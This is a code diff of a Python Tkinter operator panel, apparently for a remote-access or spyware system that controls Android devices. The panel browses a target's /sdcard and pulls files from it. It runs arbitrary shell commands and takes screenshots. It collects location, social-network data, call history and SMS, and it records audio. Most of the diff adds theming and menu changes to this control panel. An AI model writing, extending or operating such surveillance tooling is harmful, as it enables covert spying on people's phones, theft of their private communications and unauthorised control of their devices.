-            )
-
-        context_menu.add_separator()
-        context_menu.add_command(
-            label="Copy Path", command=lambda: self.copy_path_to_clipboard(item_path)
-        )
-
-        # Display the menu
-        try:
-            context_menu.tk_popup(event.x_root, event.y_root)
-        finally:
-            context_menu.grab_release()
-
-    def copy_path_to_clipboard(self, path):
-        """Copy the path to clipboard"""
-        self.window.clipboard_clear()
-        self.window.clipboard_append(path)
-        self.status_var.set(f"Copied to clipboard: {path}")
-
-    def get_full_path(self, item_id):
-        """Get the full path for a tree item"""
-        if not item_id:
-            return self.current_path
-
-        item_text = self.tree.item(item_id, "text")
-        # استخراج النص بدون الأيقونة
-        if " " in item_text:
-            item_text = item_text.split(" ", 1)[1]
-
-        if self.current_path.endswith("/"):
-            return f"{self.current_path}{item_text}"
-        else:
-            return f"{self.current_path}/{item_text}"
-
-    def on_tree_right_click(self, event):
-        """Handle right-click on tree items"""
-        # Select the item under cursor
-        item_id = self.tree.identify_row(event.y)
-        if item_id:
-            self.tree.selection_set(item_id)
-            self.tree.focus(item_id)
-            self.create_context_menu(event)
-
-    def on_tree_double_click(self, event):
-        """Handle double-click on tree items"""
-        item_id = self.tree.focus()
-        if item_id:
-            item_values = self.tree.item(item_id, "values")
-            if item_values and item_values[-1] == "Directory":
-                path = self.get_full_path(item_id)
-                self.navigate_to_directory(path)
-
-    def navigate_to_directory(self, path):
-        """Navigate to a directory"""
-        if self.current_path != path:
-            # Add current path to history
-            if self.history_pos < len(self.path_history) - 1:
-                # Truncate history if we're not at the end
-                self.path_history = self.path_history[: self.history_pos + 1]
-
-            self.path_history.append(path)
-            self.history_pos = len(self.path_history) - 1
-
-            # Update buttons
-            self.back_button.config(
-                state=tk.NORMAL if self.history_pos > 0 else tk.DISABLED
-            )
-            self.forward_button.config(state=tk.DISABLED)
-
-        self.current_path = path
-        self.path_var.set(path)
-        self.list_files_for_path(path)
-
-    def go_back(self):
-        """Navigate back in history"""
-        if self.history_pos > 0:
-            self.history_pos -= 1
-            path = self.path_history[self.history_pos]
-            self.current_path = path
-            self.path_var.set(path)
-            self.list_files_for_path(path)
-
-            # Update buttons
-            self.back_button.config(
-                state=tk.NORMAL if self.history_pos > 0 else tk.DISABLED
-            )
-            self.forward_button.config(state=tk.NORMAL)
-
-    def go_forward(self):
-        """Navigate forward in history"""
-        if self.history_pos < len(self.path_history) - 1:
-            self.history_pos += 1
-            path = self.path_history[self.history_pos]
-            self.current_path = path
-            self.path_var.set(path)
-            self.list_files_for_path(path)
-
-            # Update buttons
-            self.forward_button.config(
-                state=(
-                    tk.NORMAL
-                    if self.history_pos < len(self.path_history) - 1
-                    else tk.DISABLED
-                )
-            )
-            self.back_button.config(state=tk.NORMAL)
-
-    def go_up(self):
-        """Navigate to parent directory"""
-        if (
-            self.current_path == "/"
-            or self.current_path == ""
-            or self.current_path == "/sdcard"
-        ):
-            return
-
-        parent_path = os.path.dirname(self.current_path)
-        if not parent_path:
-            parent_path = "/sdcard"
-
-        self.navigate_to_directory(parent_path)
-
-    def navigate_to_path(self):
-        """Navigate to the path in the entry field"""
-        path = self.path_var.get()
-        if not path:
-            path = "/sdcard"
-
-        self.navigate_to_directory(path)
-
-    def open_directory(self, path):
-        """Open a directory"""
-        self.navigate_to_directory(path)
-
-    def populate_tree(self):
-        """Initial population of the tree"""
-        self.status_var.set("Loading file list...")
-        self.tree.delete(*self.tree.get_children())
-
-        # Start with sdcard directory
-        self.list_files_for_path("/sdcard")
-
-    def populate_tree_for_path(self, path):
-        """Populate tree with files from a specific path"""
-        self.tree.delete(*self.tree.get_children())
-
-        files = remote_fs_manager.get_files_from_cache(self.device_id, path)
-
-        if files and len(files) > 0:
-            # Sort directories first, then files
-            directories = [f for f in files if f.get("type") == "directory"]
-            regular_files = [f for f in files if f.get("type") != "directory"]
-
-            # Sort directories and files by name
-            directories.sort(key=lambda x: x.get("name", "").lower())
-            regular_files.sort(key=lambda x: x.get("name", "").lower())
-
-            # Add directories first
-            for file_info in directories:
-                name = file_info.get("name", "Unknown")
-                size = file_info.get("size", 0)
-                size_str = self.format_size(size)
-                date = file_info.get("modified", "Unknown")
-
-                icon = "📁"
-
-                self.tree.insert(
-                    "",
-                    "end",
-                    text=f"{icon} {name}",
-                    values=(size_str, date, "Directory"),
-                )
-
-            # Then add files
-            for file_info in regular_files:
-                name = file_info.get("name", "Unknown")
-                size = file_info.get("size", 0)
-                size_str = self.format_size(size)
-                date = file_info.get("modified", "Unknown")
-                file_type = self.get_file_type(name)
-
-                icon = Utils.get_file_icon(name)
-
-                self.tree.insert(
-                    "", "end", text=f"{icon} {name}", values=(size_str, date, file_type)
-                )
-
-            self.status_var.set(f"تم تحميل {len(files)} عنصر من {path}")
-        else:
-            self.status_var.set(f"لم يتم العثور على ملفات في {path} أو المجلد غير متاح")
-            self.tree.insert(
-                "", "end", text="📂 المجلد فارغ أو غير متاح", values=("", "", "")
-            )
-
-            # اقتراح مجلدات بديلة إذا كان المجلد فارغًا
-            if path == "/" or path == "":
-                self.tree.insert(
-                    "",
-                    "end",
-                    text="💡 جرّب استخدام /sdcard بدلاً من ذلك",
-                    values=("", "", ""),
-                )
-                # إضافة زر للانتقال إلى /sdcard
-                go_to_sdcard = self.tree.insert(
-                    "",
-                    "end",
-                    text="🔄 انقر هنا للذهاب إلى /sdcard",
-                    values=("", "", "مجلد مقترح"),
-                )
-                # ربط حدث النقر المزدوج على هذا العنصر
-                self.tree.item(go_to_sdcard, tags=("goto_sdcard",))
-                self.tree.tag_bind(
-                    "goto_sdcard",
-                    "<Double-1>",
-                    lambda e: self.navigate_to_directory("/sdcard"),
-                )
-
-    def list_files_for_path(self, path):
-        """Request file listing for a path"""
-        if not self.target_id:
-            self.status_var.set("Error: No connected device")
-            return
-
-        # تحويل المسار '/' إلى '/sdcard' تلقائياً
-        if path == "/":
-            path = "/sdcard"
-            self.current_path = "/sdcard"
-            self.path_var.set("/sdcard")
-
-        # عرض رسالة تحميل واضحة
-        self.status_var.set(f"جاري تحميل قائمة الملفات من: {path}...")
-        self.tree.delete(*self.tree.get_children())
-
-        # إضافة مؤشر "جاري التحميل" للشجرة
-        self.tree.insert(
-            "", "end", text="⏳ جاري تحميل قائمة الملفات...", values=("", "", "")
-        )
-        self.window.update()  # تحديث الواجهة لإظهار رسالة التحميل
-
-        # Check if we have a cached result that's still valid
-        if remote_fs_manager.is_cache_valid(self.device_id, path):
-            self.tree.delete(*self.tree.get_children())  # إزالة مؤشر التحميل
-            self.populate_tree_for_path(path)
-            return
-
-        # Request file listing from device
-        try:
-            result = send_command_to_client(
-                self.target_id, Commands.SIO_CMD_LIST_FILES, args={"path": path}
-            )
-
-            if result.get("status") == "sent":
-                self.current_path = path
-                self.path_var.set(path)
-                # سيتم تحديث الشجرة عند استلام الرد من خلال معالج استجابة uploadCommandFile
-            else:
-                self.tree.delete(*self.tree.get_children())  # إزالة مؤشر التحميل
-                self.status_var.set(
-                    f"خطأ في طلب قائمة الملفات: {result.get('message', 'خطأ غير معروف')}"
-                )
-                # إضافة رسالة خطأ للشجرة
-                self.tree.insert(
-                    "",
-                    "end",
-                    text="⚠️ حدث خطأ في جلب قائمة الملفات",
-                    values=("", "", ""),
-                )
-
-                # محاولة المسار البديل تلقائياً إذا فشل المسار الحالي
-                if path != "/sdcard" and path != "/storage/emulated/0":
-                    self.status_var.set("جاري محاولة المسار البديل...")
-                    self.window.update()
-                    self.list_files_for_path("/sdcard")
-        except Exception as e:
-            self.tree.delete(*self.tree.get_children())  # إزالة مؤشر التحميل
-            self.status_var.set(f"استثناء أثناء طلب قائمة الملفات: {str(e)}")
-            # إضافة رسالة خطأ للشجرة
-            self.tree.insert("", "end", text=f"⚠️ خطأ: {str(e)}", values=("", "", ""))
-            logger.error(f"Exception in list_files_for_path: {e}", exc_info=True)
-
-    def refresh_current_directory(self):
-        """Refresh the current directory listing"""
-        # Clear cache for this path
-        remote_fs_manager.file_cache.pop(self.device_id, {})
-        self.list_files_for_path(self.current_path)
-
-    def format_size(self, size_bytes):
-        """Format size in bytes to human-readable format"""
-        if size_bytes < 1024:
-            return f"{size_bytes} B"
-        elif size_bytes < 1024 * 1024:
-            return f"{size_bytes / 1024:.1f} KB"
-        elif size_bytes < 1024 * 1024 * 1024:
-            return f"{size_bytes / (1024 * 1024):.1f} MB"
-        else:
-            return f"{size_bytes / (1024 * 1024 * 1024):.1f} GB"
-
-    def get_file_type(self, filename):
-        """Get file type based on extension"""
-        ext = os.path.splitext(filename)[1].lower()
-        types = {
-            ".txt": "Text File",
-            ".json": "JSON Data",
-            ".jpg": "JPEG Image",
-            ".jpeg": "JPEG Image",
-            ".png": "PNG Image",
-            ".gif": "GIF Image",
-            ".mp3": "MP3 Audio",
-            ".wav": "WAV Audio",
-            ".mp4": "MP4 Video",
-            ".pdf": "PDF Document",
-            ".doc": "Word Document",
-            ".docx": "Word Document",
-            ".xls": "Excel Spreadsheet",
-            ".xlsx": "Excel Spreadsheet",
-            ".zip": "ZIP Archive",
-            ".rar": "RAR Archive",
-            ".7z": "7Z Archive",
-            ".apk": "Android Package",
-            ".db": "Database File",
-        }
-        return types.get(ext, f"{ext.upper()[1:] if ext else 'Unknown'} File")
-
-    def show_file_details(self, file_path):
-        """Show details for the selected file"""
-        selected_item = self.tree.focus()
-        if not selected_item:
-            return
-
-        item_text = self.tree.item(selected_item, "text")
-        item_values = self.tree.item(selected_item, "values")
-
-        self.details_text.config(state=tk.NORMAL)
-        self.details_text.delete("1.0", tk.END)
-
-        self.details_text.insert(tk.END, f"Name: {item_text}\n")
-        self.details_text.insert(tk.END, f"Size: {item_values[0]}\n")
-        self.details_text.insert(tk.END, f"Modified: {item_values[1]}\n")
-        self.details_text.insert(tk.END, f"Type: {item_values[2]}\n")
-        self.details_text.insert(tk.END, f"Path: {file_path}\n")
-
-        self.details_text.config(state=tk.DISABLED)
-
-    def upload_selected(self):
-        """Upload the selected file"""
-        selected_item = self.tree.focus()
-        if not selected_item:
-            messagebox.showinfo(
-                "Select File", "Please select a file to upload.", parent=self.window
-            )
-            return
-
-        item_values = self.tree.item(selected_item, "values")
-        if item_values[-1] == "Directory":
-            messagebox.showinfo(
-                "Select File",
-                "Please select a file, not a directory.",
-                parent=self.window,
-            )
-            return
-
-        file_path = self.get_full_path(selected_item)
-        self.upload_file(file_path)
-
-    def upload_file(self, file_path):
-        """Upload a specific file"""
-        if not self.target_id:
-            messagebox.showerror("Error", "No connected device.", parent=self.window)
-            return
-
-        result = send_command_to_client(
-            self.target_id,
-            Commands.SIO_CMD_UPLOAD_SPECIFIC_FILE,
-            args={"path": file_path},
-        )
-
-        if result.get("status") == "sent":
-            self.status_var.set(f"Upload requested for: {file_path}")
-        else:
-            messagebox.showerror(
-                "Upload Error",
-                f"Failed to request upload: {result.get('message', 'Unknown error')}",
-                parent=self.window,
-            )
-
-    def analyze_selected(self):
-        """Analyze the selected file"""
-        selected_item = self.tree.focus()
-        if not selected_item:
-            messagebox.showinfo(
-                "Select File", "Please select a file to analyze.", parent=self.window
-            )
-            return
-
-        file_path = self.get_full_path(selected_item)
-        self.analyze_file(file_path)
-
-    def analyze_file(self, file_path):
-        """Analyze a specific file"""
-        if not self.target_id:
-            messagebox.showerror("Error", "No connected device.", parent=self.window)
-            return
-
-        result = send_command_to_client(
-            self.target_id,
-            Commands.SIO_CMD_ANALYZE_CONTENT,
-            args={"filePath": file_path},
-        )
-
-        if result.get("status") == "sent":
-            self.status_var.set(f"Analysis requested for: {file_path}")
-        else:
-            messagebox.showerror(
-                "Analysis Error",
-                f"Failed to request analysis: {result.get('message', 'Unknown error')}",
-                parent=self.window,
-            )
-
-    def execute_command(self):
-        """Execute a shell command"""
-        if not self.target_id:
-            messagebox.showerror("Error", "No connected device.", parent=self.window)
-            return
-
-        command = simpledialog.askstring(
-            "Execute Command",
-            "Enter the system command to execute:",
-            parent=self.window,
-        )
-
-        if command:
-            result = send_command_to_client(
-                self.target_id,
-                Commands.SIO_CMD_EXECUTE_SHELL,
-                args={"command": command},
-            )
-
-            if result.get("status") == "sent":
-                self.status_var.set(f"Command sent: {command}")
-            else:
-                messagebox.showerror(
-                    "Command Error",
-                    f"Failed to send command: {result.get('message', 'Unknown error')}",
-                    parent=self.window,
-                )
-
-    def close(self):
-        """Close the window"""
-        self.window.destroy()
-
-
-# --- Main GUI Application ---
+# --- Enhanced GUI Application with Dark Mode ---
 class AdvancedControlPanelApp:
     def __init__(self, master):
         self.master = master
-        master.title("Advanced Communication Monitor Control Panel v2.0")
-        master.geometry("1200x800")
-        master.minsize(1000, 700)
+        master.title("Advanced Communication Monitor Control Panel v2.0 Enhanced")
+        master.geometry(settings_manager.get("window_geometry", "1400x900"))
+        master.minsize(1200, 800)
+
+        # Initialize theme
+        theme_manager.current_theme = settings_manager.get("theme", "light")
+        self.current_theme = theme_manager.get_theme()
 
         # State
         self.current_selected_live_client_sid = None
         self.current_selected_historical_device_id = None
         self.file_browser = None
 
-        # List managers
-        self.live_clients_manager = None
-        self.historical_devices_manager = None
-
+        # Initialize components
+        self._setup_styles()
         self._setup_main_interface()
         self._initialize_data()
+        self._apply_theme()
+
+        # Bind events
+        master.protocol("WM_DELETE_WINDOW", self._on_closing)
+
+    def _setup_styles(self):
+        """إعداد الأنماط للواجهة"""
+        self.style = ttk.Style()
+
+        # Configure ttk styles for current theme
+        self._configure_ttk_styles()
+
+    def _configure_ttk_styles(self):
+        """تكوين أنماط ttk للثيم الحالي"""
+        theme = self.current_theme
+
+        # Configure main styles
+        self.style.configure("Themed.TFrame", background=theme["frame_bg"])
+        self.style.configure(
+            "Themed.TLabel", background=theme["frame_bg"], foreground=theme["fg"]
+        )
+        self.style.configure(
+            "Themed.TButton",
+            background=theme["button_bg"],
+            foreground=theme["button_fg"],
+        )
+        self.style.configure(
+            "Themed.TEntry",
+            fieldbackground=theme["entry_bg"],
+            foreground=theme["entry_fg"],
+        )
+
+        # Configure notebook styles
+        self.style.configure("Themed.TNotebook", background=theme["frame_bg"])
+        self.style.configure(
+            "Themed.TNotebook.Tab",
+            background=theme["button_bg"],
+            foreground=theme["button_fg"],
+        )
 
     def _setup_main_interface(self):
         """إعداد الواجهة الرئيسية"""
         self._create_menu_bar()
 
-        main_pane = ttk.PanedWindow(self.master, orient=tk.HORIZONTAL)
+        main_pane = ttk.PanedWindow(
+            self.master, orient=tk.HORIZONTAL, style="Themed.TPanedwindow"
+        )
         main_pane.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
-        left_pane = ttk.Frame(main_pane, width=350)
+        left_pane = ttk.Frame(main_pane, width=400, style="Themed.TFrame")
         main_pane.add(left_pane, weight=1)
         self._setup_left_panel(left_pane)
 
-        right_pane = ttk.Frame(main_pane, width=850)
+        right_pane = ttk.Frame(main_pane, width=1000, style="Themed.TFrame")
         main_pane.add(right_pane, weight=3)
         self._setup_right_panel(right_pane)
 
     def _create_menu_bar(self):
-        """إنشاء شريط القوائم"""
+        """إنشاء شريط القوائم المحسن"""
         menubar = tk.Menu(self.master)
         self.master.config(menu=menubar)
 
         # File menu
         file_menu = tk.Menu(menubar, tearoff=0)
         menubar.add_cascade(label="File", menu=file_menu)
-        file_menu.add_command(label="Open File Browser", command=self.open_file_browser)
         file_menu.add_command(
-            label="Export Device Data", command=self._export_device_data
+            label="🗂️ Open File Browser", command=self.open_file_browser
         )
-        file_menu.add_command(label="Import Settings", command=self._import_settings)
+        file_menu.add_command(
+            label="📊 Export Device Data", command=self._export_device_data
+        )
+        file_menu.add_command(label="⚙️ Import Settings", command=self._import_settings)
         file_menu.add_separator()
-        file_menu.add_command(label="Exit", command=self.master.quit)
+        file_menu.add_command(label="❌ Exit", command=self.master.quit)
+
+        # View menu
+        view_menu = tk.Menu(menubar, tearoff=0)
+        menubar.add_cascade(label="View", menu=view_menu)
+        view_menu.add_command(label="🌙 Toggle Dark Mode", command=self._toggle_theme)
+        view_menu.add_separator()
+        view_menu.add_command(label="🔄 Refresh All", command=self._refresh_all)
+        view_menu.add_command(
+            label="📊 Statistics Dashboard", command=self._show_statistics
+        )
 
         # Tools menu
         tools_menu = tk.Menu(menubar, tearoff=0)
         menubar.add_cascade(label="Tools", menu=tools_menu)
-        tools_menu.add_command(label="Clear All Data", command=self._clear_all_data)
-        tools_menu.add_command(label="Server Status", command=self._show_server_status)
+        tools_menu.add_command(label="🗑️ Clear All Data", command=self._clear_all_data)
         tools_menu.add_command(
-            label="Refresh File Cache", command=lambda: remote_fs_manager.clear_cache()
+            label="🖥️ Server Status", command=self._show_server_status
         )
+        tools_menu.add_command(
+            label="🔄 Refresh File Cache", command=self._refresh_file_cache
+        )
+        tools_menu.add_separator()
+        tools_menu.add_command(label="⚙️ Settings", command=self._show_settings)
 
         # Help menu
         help_menu = tk.Menu(menubar, tearoff=0)
         menubar.add_cascade(label="Help", menu=help_menu)
-        help_menu.add_command(label="About", command=self._show_about)
+        help_menu.add_command(label="📖 User Guide", command=self._show_user_guide)
+        help_menu.add_command(
+            label="🔧 Troubleshooting", command=self._show_troubleshooting
+        )
+        help_menu.add_separator()
+        help_menu.add_command(label="ℹ️ About", command=self._show_about)
 
     def _setup_left_panel(self, parent):
-        """إعداد اللوحة اليسرى"""
-        # Live clients
-        live_clients_frame = ttk.LabelFrame(parent, text="🟢 Live Monitors (Active)")
+        """إعداد اللوحة اليسرى المحسنة"""
+        # Live clients section
+        live_clients_frame = ttk.LabelFrame(
+            parent, text="🟢 Live Monitors (Active)", style="Themed.TLabelframe"
+        )
         live_clients_frame.pack(pady=5, padx=5, fill=tk.X)
 
+        # Add status indicator
+        self.live_status_frame = tk.Frame(
+            live_clients_frame, bg=self.current_theme["frame_bg"]
+        )
+        self.live_status_frame.pack(fill=tk.X, padx=5, pady=2)
+
+        self.live_count_label = tk.Label(
+            self.live_status_frame,
+            text="Connected: 0",
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+            font=("Arial", 9, "bold"),
+        )
+        self.live_count_label.pack(side=tk.LEFT)
+
         self.live_clients_listbox = tk.Listbox(
-            live_clients_frame, height=8, font=("Arial", 9)
+            live_clients_frame,
+            height=8,
+            font=("Consolas", 9),
+            bg=self.current_theme["listbox_bg"],
+            fg=self.current_theme["listbox_fg"],
+            selectbackground=self.current_theme["select_bg"],
+            selectforeground=self.current_theme["select_fg"],
         )
         scrollbar_live = ttk.Scrollbar(live_clients_frame, orient="vertical")
         self.live_clients_listbox.config(yscrollcommand=scrollbar_live.set)
@@ -1560,18 +2143,37 @@ class AdvancedControlPanelApp:
         )
         scrollbar_live.pack(side=tk.RIGHT, fill=tk.Y)
         self.live_clients_listbox.bind("<<ListboxSelect>>", self._on_live_client_select)
-
-        # Add right-click menu for live clients
         self.live_clients_listbox.bind("<Button-3>", self._on_live_client_right_click)
 
-        # Historical devices
+        # Historical devices section
         historical_devices_frame = ttk.LabelFrame(
-            parent, text="📁 Historical Monitors (Archive)"
+            parent, text="📁 Historical Monitors (Archive)", style="Themed.TLabelframe"
         )
         historical_devices_frame.pack(pady=5, padx=5, fill=tk.X)
 
+        # Add archive status
+        self.archive_status_frame = tk.Frame(
+            historical_devices_frame, bg=self.current_theme["frame_bg"]
+        )
+        self.archive_status_frame.pack(fill=tk.X, padx=5, pady=2)
+
+        self.archive_count_label = tk.Label(
+            self.archive_status_frame,
+            text="Archived: 0",
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+            font=("Arial", 9, "bold"),
+        )
+        self.archive_count_label.pack(side=tk.LEFT)
+
         self.historical_devices_listbox = tk.Listbox(
-            historical_devices_frame, height=12, font=("Arial", 9)
+            historical_devices_frame,
+            height=12,
+            font=("Consolas", 9),
+            bg=self.current_theme["listbox_bg"],
+            fg=self.current_theme["listbox_fg"],
+            selectbackground=self.current_theme["select_bg"],
+            selectforeground=self.current_theme["select_fg"],
         )
         scrollbar_hist = ttk.Scrollbar(historical_devices_frame, orient="vertical")
         self.historical_devices_listbox.config(yscrollcommand=scrollbar_hist.set)
@@ -1584,347 +2186,549 @@ class AdvancedControlPanelApp:
         self.historical_devices_listbox.bind(
             "<<ListboxSelect>>", self._on_historical_device_select
         )
-
-        # Add right-click menu for historical devices
         self.historical_devices_listbox.bind(
             "<Button-3>", self._on_historical_device_right_click
         )
 
-        # Archive buttons
-        archive_buttons_frame = ttk.Frame(historical_devices_frame)
+        # Archive control buttons
+        archive_buttons_frame = tk.Frame(
+            historical_devices_frame, bg=self.current_theme["frame_bg"]
+        )
         archive_buttons_frame.pack(fill=tk.X, padx=5, pady=2)
 
-        ttk.Button(
-            archive_buttons_frame,
-            text="🔄 Refresh",
-            command=self.refresh_historical_device_list,
-        ).pack(side=tk.LEFT, padx=2)
-        ttk.Button(
-            archive_buttons_frame, text="🏷️ Tag Device", command=self._tag_device
-        ).pack(side=tk.LEFT, padx=2)
-        ttk.Button(
-            archive_buttons_frame, text="🗑️ Delete", command=self._delete_device_data
-        ).pack(side=tk.LEFT, padx=2)
+        buttons = [
+            ("🔄", self.refresh_historical_device_list, "Refresh"),
+            ("🏷️", self._tag_device, "Tag Device"),
+            ("📂", self.open_file_browser, "Browse Files"),
+            ("🗑️", self._delete_device_data, "Delete"),
+        ]
 
-        # Add Browse Files button
-        ttk.Button(
-            archive_buttons_frame,
-            text="📂 Browse Files",
-            command=self.open_file_browser,
-        ).pack(side=tk.LEFT, padx=2)
+        for icon, command, tooltip in buttons:
+            btn = tk.Button(
+                archive_buttons_frame,
+                text=icon,
+                command=command,
+                bg=self.current_theme["button_bg"],
+                fg=self.current_theme["button_fg"],
+                relief=tk.FLAT,
+                width=4,
+            )
+            btn.pack(side=tk.LEFT, padx=2)
 
-        # Activity log
-        log_frame = ttk.LabelFrame(parent, text="📊 System Activity Log")
+        # Enhanced activity log
+        log_frame = ttk.LabelFrame(
+            parent, text="📊 System Activity Log", style="Themed.TLabelframe"
+        )
         log_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
 
+        # Log controls
+        log_controls_frame = tk.Frame(log_frame, bg=self.current_theme["frame_bg"])
+        log_controls_frame.pack(fill=tk.X, padx=5, pady=2)
+
+        tk.Button(
+            log_controls_frame,
+            text="🗑️",
+            command=self._clear_log,
+            bg=self.current_theme["button_bg"],
+            fg=self.current_theme["button_fg"],
+            relief=tk.FLAT,
+            width=4,
+        ).pack(side=tk.LEFT, padx=2)
+
+        tk.Button(
+            log_controls_frame,
+            text="💾",
+            command=self._save_log,
+            bg=self.current_theme["button_bg"],
+            fg=self.current_theme["button_fg"],
+            relief=tk.FLAT,
+            width=4,
+        ).pack(side=tk.LEFT, padx=2)
+
         self.log_text = scrolledtext.ScrolledText(
-            log_frame, height=12, wrap=tk.WORD, state=tk.DISABLED, font=("Consolas", 9)
+            log_frame,
+            height=12,
+            wrap=tk.WORD,
+            state=tk.DISABLED,
+            font=("Consolas", 9),
+            bg=self.current_theme["text_bg"],
+            fg=self.current_theme["text_fg"],
         )
         self.log_text.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
 
     def _setup_right_panel(self, parent):
-        """إعداد اللوحة اليمنى"""
-        # Device details
-        details_frame = ttk.LabelFrame(parent, text="📋 Monitor Details & Data Files")
-        details_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
+        """إعداد اللوحة اليمنى المحسنة"""
+        # Enhanced device details with tabs
+        details_notebook = ttk.Notebook(parent, style="Themed.TNotebook")
+        details_notebook.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
+
+        # Device Info Tab
+        info_tab = ttk.Frame(details_notebook, style="Themed.TFrame")
+        details_notebook.add(info_tab, text="📋 Device Info")
 
         self.details_text = scrolledtext.ScrolledText(
-            details_frame,
+            info_tab,
             height=18,
             wrap=tk.WORD,
             state=tk.DISABLED,
             font=("Consolas", 9),
+            bg=self.current_theme["text_bg"],
+            fg=self.current_theme["text_fg"],
         )
         self.details_text.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
 
-        # Commands panel
-        self.commands_frame = ttk.LabelFrame(parent, text="🎮 Monitor Control Commands")
+        # Statistics Tab
+        stats_tab = ttk.Frame(details_notebook, style="Themed.TFrame")
+        details_notebook.add(stats_tab, text="📊 Statistics")
+
+        self.stats_text = scrolledtext.ScrolledText(
+            stats_tab,
+            height=18,
+            wrap=tk.WORD,
+            state=tk.DISABLED,
+            font=("Consolas", 9),
+            bg=self.current_theme["text_bg"],
+            fg=self.current_theme["text_fg"],
+        )
+        self.stats_text.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
+
+        # Enhanced commands panel
+        self.commands_frame = ttk.LabelFrame(
+            parent, text="🎮 Monitor Control Commands", style="Themed.TLabelframe"
+        )
         self.commands_frame.pack(pady=5, padx=5, fill=tk.X)
-        self._setup_commands_panel()
+        self._setup_enhanced_commands_panel()
 
-    def _on_live_client_right_click(self, event):
-        """Handle right-click on live clients listbox"""
-        # Select the item under cursor
-        self.live_clients_listbox.selection_clear(0, tk.END)
-        self.live_clients_listbox.selection_set(
-            self.live_clients_listbox.nearest(event.y)
-        )
-        self.live_clients_listbox.activate(self.live_clients_listbox.nearest(event.y))
-
-        # Update selected client
-        self._on_live_client_select()
-
-        # Create context menu
-        context_menu = Menu(self.master, tearoff=0)
-        context_menu.add_command(label="Browse Files", command=self.open_file_browser)
-        context_menu.add_command(
-            label="Get Social Network Data", command=self.get_social_network_data
-        )
-        context_menu.add_command(
-            label="Get Communication History", command=self.get_communication_history
-        )
-        context_menu.add_command(label="Record Audio", command=self.record_audio_fixed)
-        context_menu.add_separator()
-        context_menu.add_command(label="Tag Device", command=self._tag_device)
-
-        # Display the menu
-        try:
-            context_menu.tk_popup(event.x_root, event.y_root)
-        finally:
-            context_menu.grab_release()
-
-    def _on_historical_device_right_click(self, event):
-        """Handle right-click on historical devices listbox"""
-        # Select the item under cursor
-        self.historical_devices_listbox.selection_clear(0, tk.END)
-        self.historical_devices_listbox.selection_set(
-            self.historical_devices_listbox.nearest(event.y)
-        )
-        self.historical_devices_listbox.activate(
-            self.historical_devices_listbox.nearest(event.y)
-        )
-
-        # Update selected device
-        self._on_historical_device_select()
-
-        # Create context menu
-        context_menu = Menu(self.master, tearoff=0)
-
-        # Check if device is online
-        is_online = self.current_selected_live_client_sid is not None
-
-        if is_online:
-            context_menu.add_command(
-                label="Browse Files", command=self.open_file_browser
-            )
-            context_menu.add_separator()
-
-        context_menu.add_command(
-            label="View Details",
-            command=lambda: self.display_device_details(
-                self.current_selected_historical_device_id
-            ),
-        )
-        context_menu.add_command(label="Tag Device", command=self._tag_device)
-        context_menu.add_command(label="Delete Data", command=self._delete_device_data)
-
-        # Display the menu
-        try:
-            context_menu.tk_popup(event.x_root, event.y_root)
-        finally:
-            context_menu.grab_release()
-
-    def _setup_commands_panel(self):
-        """إعداد لوحة الأوامر"""
-        commands_notebook = ttk.Notebook(self.commands_frame)
+    def _setup_enhanced_commands_panel(self):
+        """إعداد لوحة الأوامر المحسنة"""
+        commands_notebook = ttk.Notebook(self.commands_frame, style="Themed.TNotebook")
         commands_notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
         # Basic operations tab
-        basic_tab = ttk.Frame(commands_notebook)
-        commands_notebook.add(basic_tab, text="Basic Operations")
+        basic_tab = ttk.Frame(commands_notebook, style="Themed.TFrame")
+        commands_notebook.add(basic_tab, text="🔧 Basic Ops")
         self._setup_basic_commands(basic_tab)
 
-        # Communication analysis tab
-        comm_tab = ttk.Frame(commands_notebook)
-        commands_notebook.add(comm_tab, text="Communication Analysis")
+        # Enhanced communication analysis tab
+        comm_tab = ttk.Frame(commands_notebook, style="Themed.TFrame")
+        commands_notebook.add(comm_tab, text="📞 Communication")
         self._setup_communication_commands(comm_tab)
 
+        # Enhanced SMS tab
+        sms_tab = ttk.Frame(commands_notebook, style="Themed.TFrame")
+        commands_notebook.add(sms_tab, text="💬 Enhanced SMS")
+        self._setup_enhanced_sms_commands(sms_tab)
+
         # Audio monitoring tab
-        audio_tab = ttk.Frame(commands_notebook)
-        commands_notebook.add(audio_tab, text="Audio Monitoring")
+        audio_tab = ttk.Frame(commands_notebook, style="Themed.TFrame")
+        commands_notebook.add(audio_tab, text="🎵 Audio")
         self._setup_audio_commands(audio_tab)
 
-        # File operations tab
-        file_tab = ttk.Frame(commands_notebook)
-        commands_notebook.add(file_tab, text="File Operations")
-        self._setup_file_commands(file_tab)
+        # Enhanced file operations tab
+        file_tab = ttk.Frame(commands_notebook, style="Themed.TFrame")
+        commands_notebook.add(file_tab, text="📁 Files")
+        self._setup_enhanced_file_commands(file_tab)
 
     def _setup_basic_commands(self, parent):
         """إعداد الأوامر الأساسية"""
-        frame = ttk.Frame(parent)
+        frame = tk.Frame(parent, bg=self.current_theme["frame_bg"])
         frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
         commands = [
-            ("📷 Capture Screen", self.take_screenshot),
+            ("📷 Screenshot", self.take_screenshot),
             ("📂 List Files", self.list_files),
             ("🌍 Get Location", self.get_location),
             ("📤 Upload File", self.upload_specific_file),
-            ("⚡ Execute Command", self.execute_shell_command),
+            ("⚡ Execute Shell", self.execute_shell_command),
         ]
 
         self.command_buttons = {}
         for i, (text, command) in enumerate(commands):
-            button = ttk.Button(frame, text=text, command=command, state=tk.DISABLED)
+            button = tk.Button(
+                frame,
+                text=text,
+                command=command,
+                state=tk.DISABLED,
+                bg=self.current_theme["button_bg"],
+                fg=self.current_theme["button_fg"],
+                relief=tk.RAISED,
+                font=("Arial", 9),
+            )
             button.grid(row=i // 2, column=i % 2, padx=5, pady=5, sticky="ew")
             self.command_buttons[text] = button
 
         frame.columnconfigure(0, weight=1)
         frame.columnconfigure(1, weight=1)
 
-    def _setup_file_commands(self, parent):
